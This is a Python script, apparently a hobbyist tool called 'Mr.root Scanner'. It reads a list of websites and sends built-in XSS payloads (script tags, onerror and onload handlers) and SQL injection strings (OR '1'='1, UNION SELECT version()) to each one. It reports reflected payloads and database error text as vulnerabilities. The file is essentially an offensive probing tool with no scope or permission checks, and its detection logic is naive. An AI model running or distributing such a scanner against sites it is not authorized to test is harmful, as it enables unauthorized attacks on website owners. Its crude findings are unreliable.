import requests
import pyfiglet
from termcolor import colored
import os
from prettytable import PrettyTable

# ASCII banner using pyfiglet
ascii_banner = pyfiglet.figlet_format("Mr.root Scanner")
print(colored(ascii_banner, "light_blue"))

# Common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\" onmouseover=alert('XSS') x=\"",
    "<img src=x onerror=alert('XSS')>",
    "'\"><svg/onload=alert('XSS')>"
]

# Common SQL Injection payloads
sql_payloads = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL, version()--",
    "\" UNION SELECT NULL, database()--",
    "' AND 1=1--",
    "' OR 'a'='a"
]

# Load websites from file
def load_websites(file_name):
    if not os.path.exists(file_name):
        print(colored(f"File {file_name} not found!", "red"))
        return []
    with open(file_name, "r") as file:
        return [line.strip() for line in file if line.strip()]

# Test XSS vulnerabilities
def test_xss(url):
    xss_results = []
    for payload in xss_payloads:
        try:
            # Test by injecting payload in the URL query parameters
            response = requests.get(url + payload, timeout=10)
            if payload in response.text:
                xss_results.append({
                    "url": url,
                    "payload": payload
                })
        except requests.exceptions.RequestException as e:
            print(colored(f"[XSS TEST] Error testing {url}: {e}", "red"))
    return xss_results

# Test SQL Injection vulnerabilities
def test_sql(url):
    sql_results = []
    for payload in sql_payloads:
        try:
            # Test by injecting payload in the URL query parameters
            response = requests.get(url + payload, timeout=10)
            if "syntax error" in response.text.lower() or "mysql" in response.text.lower():
                sql_results.append({
                    "url": url,
                    "payload": payload
                })
        except requests.exceptions.RequestException as e:
            print(colored(f"[SQL TEST] Error testing {url}: {e}", "red"))
    return sql_results

# Scan websites for vulnerabilities
def scan_websites(file_name):
    websites = load_websites(file_name)
    if not websites:
        return

    for website in websites:
        print(colored(f"\n[+] Scanning: {website}", "cyan"))

        # Prepare tables for results
        xss_table = PrettyTable()
        xss_table.field_names = ["URL", "Payload"]

        sql_table = PrettyTable()
        sql_table.field_names = ["URL", "Payload"]

        # Check for XSS vulnerabilities
        xss_results = test_xss(website)
        if xss_results:
            for result in xss_results:
                xss_table.add_row([result['url'], result['payload']])

        # Check for SQL Injection vulnerabilities
        sql_results = test_sql(website)
        if sql_results:
            for result in sql_results:
                sql_table.add_row([result['url'], result['payload']])

        # Display results
        if xss_table.rowcount > 0:
            print(colored("\n[XSS Vulnerabilities Found!]", "yellow"))
            print(xss_table)
        else:
            print(colored("\nNo XSS vulnerabilities found.", "red"))

        if sql_table.rowcount > 0:
            print(colored("\n[SQL Injection Vulnerabilities Found!]", "yellow"))
            print(sql_table)
        else:
            print(colored("\nNo SQL Injection vulnerabilities found.", "red"))

    print(colored("\n[+] Scan Complete!", "light_blue"))

# Main function
if __name__ == "__main__":
    print(colored("Enter the file name containing the list of websites (e.g., list.txt):", "yellow"))
    file_name = input("> ").strip()
    scan_websites(file_name)
